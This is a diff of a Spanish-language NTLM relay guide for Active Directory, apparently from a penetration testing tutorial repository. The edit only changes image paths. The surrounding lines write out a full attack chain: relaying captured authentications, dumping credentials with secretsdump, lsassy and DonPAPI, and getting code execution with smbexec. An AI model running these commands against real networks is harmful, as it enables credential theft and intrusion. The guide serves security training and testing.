@@ -5,7 +5,7 @@
 poetry run crackmapexec smb <rango ip> --gen-relay-list <output equipos relay>
 ```
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/vid.gif?raw=true "Relay list")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/files/vid.gif?raw=true "Relay list")
 
 ```Bash
 # Deshabilitar las opciones SMB y HTTP de Responder y ejecutarlo
@@ -15,8 +15,8 @@ impacket-ntlmrelayx -tf <output equipos relay> -of netntlm -smb2support -socks
 # Insertar el comando "socks" en la misma terminal para obtener las autenticaciones capturadas
 ```
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/vid2.gif?raw=true "Deshabilitar SMB y HHTP Ejecutar responder y ntlmrelayx")
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/vid3.gif?raw=true "Capturar autenticaciones y guardarlas en socks")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/files/vid2.gif?raw=true "Deshabilitar SMB y HHTP Ejecutar responder y ntlmrelayx")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/files/vid3.gif?raw=true "Capturar autenticaciones y guardarlas en socks")
 
 ```Bash
 # Primero modificar el puerto de la última línea de proxychains para que quede asi:
@@ -29,7 +29,7 @@ proxychains impacket-secretsdump -no-pass '<dominio>'/'<usuario>'@'<ip víctima>
 proxychains lsassy --no-pass -d <dominio> -u <usuario> <ip víctima>
 ```
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/vid4.gif?raw=true "Ejecutar comandos en las víctimas de NTLMrelay 1")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/files/vid4.gif?raw=true "Ejecutar comandos en las víctimas de NTLMrelay 1")
 
 # Redirigir las credenciales
 
@@ -39,7 +39,7 @@ proxychains lsassy --no-pass -d <dominio> -u <usuario> <ip víctima>
 proxychains poetry run DonPAPI -no-pass '<dominio>'/'<usuario>'@'<ip víctima>'
 ```
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/vid5.gif?raw=true "Ejecutar comandos en las víctimas de NTLMrelay 2")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/files/vid5.gif?raw=true "Ejecutar comandos en las víctimas de NTLMrelay 2")
 
 
 ```Bash
@@ -47,12 +47,12 @@ proxychains poetry run DonPAPI -no-pass '<dominio>'/'<usuario>'@'<ip víctima>'
 proxychains impacket-smbclient -no-pass '<dominio>'/'<usuario>'@'<ip víctima>' -debug
 ```
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/vid6.gif?raw=true "Ejecutar comandos en las víctimas de NTLMrelay 3")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/files/vid6.gif?raw=true "Ejecutar comandos en las víctimas de NTLMrelay 3")
 
 ```Bash
 # Obtener ejecución de código
 proxychains impacket-smbexec -no-pass '<dominio>'/'<usuario>'@'<ip víctima>' -debug
 ```
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/vid7.gif?raw=true "Ejecutar comandos en las víctimas de NTLMrelay 4")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/NTLM_relay/files/vid7.gif?raw=true "Ejecutar comandos en las víctimas de NTLMrelay 4")
 
